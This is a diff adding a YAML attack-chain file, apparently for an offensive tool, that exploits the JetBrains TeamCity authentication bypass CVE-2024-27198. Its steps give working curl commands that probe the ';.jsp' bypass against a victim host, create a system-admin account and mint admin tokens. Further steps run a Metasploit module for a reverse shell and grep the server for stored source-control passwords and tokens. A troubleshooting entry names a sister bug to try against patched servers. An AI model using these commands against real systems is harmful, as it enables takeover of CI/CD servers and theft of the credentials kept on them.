@@ -1,0 +1,70 @@
+chain_id: teamcity_cve_2024_27198
+title: "JetBrains TeamCity — CVE-2024-27198 unauth admin via path-suffix bypass"
+severity: CRITICAL
+tags: [web, teamcity, jetbrains, ci-cd, cve-2024-27198, auth-bypass, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-27198" }
+    - { banner_pattern: "(?i)teamcity|jetbrains" }
+    - { product_pattern: "(?i)teamcity" }
+    - { path_pattern: "(?i)/app/rest/(server|users)" }
+
+description: |
+  TeamCity On-Prem ≤ 2023.11.3: appending `;.jsp` (or any segment with
+  `;`) to admin REST endpoints bypasses the auth filter while the
+  servlet still routes the request normally. POST a new
+  `system-admin` user → SYSTEM RCE via build steps. Trivially
+  weaponized; mass-exploited within 24h of the Mar-2024 advisory by
+  state-actor-tier groups (BlueDelta / TA422).
+
+steps:
+  - id: 1
+    title: "Fingerprint TeamCity"
+    command: |
+      curl -sk -I "https://$VICTIMA:8111/login.html"
+      curl -sk "https://$VICTIMA:8111/app/rest/server" -I
+
+  - id: 2
+    title: "Probe the bypass — should return server JSON without auth"
+    command: |
+      curl -sk "https://$VICTIMA:8111/app/rest/server;.jsp"
+
+  - id: 3
+    title: "Create a new admin user"
+    command: |
+      curl -sk -X POST "https://$VICTIMA:8111/app/rest/users;.jsp" \
+        -H 'Content-Type: application/json' \
+        -d '{"username":"rootctl","password":"Rootctl123!","email":"r@evil","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}'
+
+  - id: 4
+    title: "Or: generate an admin auth token"
+    command: |
+      curl -sk -X POST "https://$VICTIMA:8111/app/rest/users/id:1/tokens/rootctl;.jsp" \
+        -H 'Accept: application/json'
+
+  - id: 5
+    title: "RCE — drop a build step that runs your command"
+    command: |
+      msfconsole -qx 'use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198; \
+        set RHOSTS $VICTIMA; set RPORT 8111; set SSL true; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 6
+    title: "Post — TeamCity stores cleartext SCM creds for every project"
+    command: |
+      # On the host (after RCE):
+      cat /opt/TeamCity/data/system/projects/*/buildTypes/*.xml | grep -E 'password|token'
+      cat /opt/TeamCity/data/config/projects/*/pluginData/credentialsJSON/*.xml
+
+common_errors:
+  - error: "All ;.jsp paths return 401"
+    solution: |
+      Patched (≥ 2023.11.4). Try the sister bug CVE-2024-27199 — same
+      bypass mechanism on a different filter, fewer endpoints reachable
+      but still gives partial admin surface.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-27198
+  - https://www.jetbrains.com/privacy-security/issues-fixed/
+  - https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/
